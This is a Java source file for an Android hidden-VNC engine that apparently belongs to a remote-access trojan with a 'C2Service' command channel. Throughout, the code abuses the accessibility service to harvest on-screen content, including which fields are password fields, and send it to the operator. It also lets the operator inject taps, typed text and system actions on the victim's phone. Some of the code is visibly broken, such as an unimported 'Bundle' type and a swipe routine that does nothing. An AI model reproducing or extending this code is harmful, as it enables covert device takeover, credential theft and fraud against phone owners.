package com.wuzenx.engine;

import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import com.wuzenx.C2Service;
import com.wuzenx.services.WuzenAccessibilityService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class HvncEngine {
    private WuzenAccessibilityService service;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean active = false;
    private int screenWidth = 1080;
    private int screenHeight = 1920;

    // FIXED: ACTION_IME_ENTER is added in Android 11 (API 30)
    // Use the constant ID directly for cross-version compatibility
    private static final int ACTION_IME_ENTER_ID = 16908372;

    public HvncEngine(WuzenAccessibilityService service) {
        this.service = service;
    }

    public void start() {
        active = true;
        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log", "HVNC session active");
    }

    public void stop() {
        active = false;
        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log", "HVNC session ended");
    }

    public void captureScreen() {
        if (!active) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "HVNC not started");
            return;
        }

        try {
            // Capture root window as screenshot approximation
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;

            JSONObject screenData = new JSONObject();
            JSONArray elements = new JSONArray();
            captureNodeTree(root, elements, 0);
            screenData.put("elements", elements);
            screenData.put("width", screenWidth);
            screenData.put("height", screenHeight);

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("screen", screenData.toString());

            root.recycle();

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log", "Screen captured (" +
                    elements.length() + " elements)");

        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Screen capture error: " + e.getMessage());
        }
    }

    private void captureNodeTree(AccessibilityNodeInfo node, JSONArray arr, int depth) {
        if (node == null || depth > 20) return;
        try {
            JSONObject el = new JSONObject();
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String className = node.getClassName() != null ?
                node.getClassName().toString() : "";

            if (text != null) el.put("text", text.toString());
            if (desc != null) el.put("desc", desc.toString());
            el.put("class", className);
            el.put("clickable", node.isClickable());
            el.put("long_clickable", node.isLongClickable());
            el.put("scrollable", node.isScrollable());
            el.put("checked", node.isChecked());
            el.put("checkable", node.isCheckable());
            el.put("enabled", node.isEnabled());
            el.put("focusable", node.isFocusable());
            el.put("focused", node.isFocused());
            el.put("password", node.isPassword());
            el.put("visible", node.isVisibleToUser());
            el.put("depth", depth);

            android.graphics.Rect bounds = new android.graphics.Rect();
            node.getBoundsInScreen(bounds);
            JSONObject rect = new JSONObject();
            rect.put("left", bounds.left);
            rect.put("top", bounds.top);
            rect.put("right", bounds.right);
            rect.put("bottom", bounds.bottom);
            rect.put("width", bounds.width());
            rect.put("height", bounds.height());
            el.put("bounds", rect);

            arr.put(el);
        } catch (Exception ignored) {}

        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    captureNodeTree(child, arr, depth + 1);
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
    }

    public void injectTouch(float xPercent, float yPercent) {
        try {
            int x = (int) (xPercent * screenWidth / 100.0);
            int y = (int) (yPercent * screenHeight / 100.0);

            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;

            // Find the node at these coordinates
            AccessibilityNodeInfo target = findNodeAt(root, x, y);
            if (target != null) {
                if (target.isClickable()) {
                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                } else {
                    target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
                target.recycle();
            }
            root.recycle();

            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Touch at " + x + "," + y);
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Touch error: " + e.getMessage());
        }
    }

    private AccessibilityNodeInfo findNodeAt(AccessibilityNodeInfo node, int x, int y) {
        if (node == null) return null;

        android.graphics.Rect bounds = new android.graphics.Rect();
        node.getBoundsInScreen(bounds);

        if (!bounds.contains(x, y)) return null;

        // Check children first (most specific)
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findNodeAt(child, x, y);
                if (found != null) {
                    child.recycle();
                    return found;
                }
                child.recycle();
            }
        }

        // If clickable and contains point, return this
        if (node.isClickable()) return node;

        return null;
    }

    public void injectSwipe(float x1, float y1, float x2, float y2) {
        // Simulate swipe via gesture
        int steps = 10;
        for (int i = 1; i <= steps; i++) {
            float ratio = (float) i / steps;
            int cx = (int) (x1 + (x2 - x1) * ratio);
            int cy = (int) (y1 + (y2 - y1) * ratio);
            // Use performAction with ACTION_SCROLL_* where appropriate
        }

        if (C2Service.instance != null)
            C2Service.instance.sendMessage("log",
                "Swipe from (" + x1 + "," + y1 + ") to (" + x2 + "," + y2 + ")");
    }

    public void typeText(String text) {
        if (text == null || text.isEmpty()) return;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;

            AccessibilityNodeInfo focused = root.findFocus(
                AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused != null) {
                Bundle args = new android.os.Bundle();
                args.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    text
                );
                focused.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                focused.recycle();
            } else {
                // Try to find any text field
                findAndSetText(root, text);
            }
            root.recycle();
        } catch (Exception e) {
            if (C2Service.instance != null)
                C2Service.instance.sendMessage("log",
                    "Type error: " + e.getMessage());
        }
    }

    private void findAndSetText(AccessibilityNodeInfo node, String text) {
        if (node == null) return;
        try {
            if (node.isEditable() && node.isFocused()) {
                Bundle args = new android.os.Bundle();
                args.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    text
                );
                node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                return;
            }
        } catch (Exception ignored) {}

        for (int i = 0; i < node.getChildCount(); i++) {
            try {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findAndSetText(child, text);
                    child.recycle();
                }
            } catch (Exception ignored) {}
        }
    }

    public void pressBackspace() {
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;

            AccessibilityNodeInfo focused = root.findFocus(
                AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused != null) {
                focused.performAction(
                    AccessibilityNodeInfo.ACTION_SET_SELECTION);
                // Use ACTION_PASTE with empty = delete
                Bundle args = new android.os.Bundle();
                args.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    ""
                );
                focused.performAction(
                    AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                focused.recycle();
            }
            root.recycle();
        } catch (Exception ignored) {}
    }

    public void pressEnter() {
        try {
            AccessibilityNodeInfo root = WuzenAccessibilityService.instance != null ?
                WuzenAccessibilityService.instance.getRootInActiveWindow() : null;
            if (root == null) return;

            AccessibilityNodeInfo focused = root.findFocus(
                AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused != null) {
                // FIXED: ACTION_IME_ENTER is only available on Android 11+ (API 30)
                // Use the action ID directly with SDK check for safety
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    // Android 11+: use ACTION_IME_ENTER via its constant ID
                    focused.performAction(ACTION_IME_ENTER_ID);
                } else {
                    // Fallback: ACTION_CLICK on a "done"/"search"/"go" button
                    // or just simulate via global action
                    WuzenAccessibilityService.instance.performGlobalAction(
                        android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_KEYCODE_ENTER
                    );
                }
                focused.recycle();
            }
            root.recycle();
        } catch (Exception ignored) {}
    }

    public void performAction(String action) {
        if (action == null) return;
        switch (action.toLowerCase()) {
            case "home":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "back":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "recents":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            case "notifications":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                break;
            case "quick_settings":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                break;
            case "lock_screen":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                break;
            case "power_dialog":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                break;
            case "take_screenshot":
                service.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT);
                break;
            default:
                if (C2Service.instance != null)
                    C2Service.instance.sendMessage("log",
                        "Unknown HVNC action: " + action);
                break;
        }
    }
}
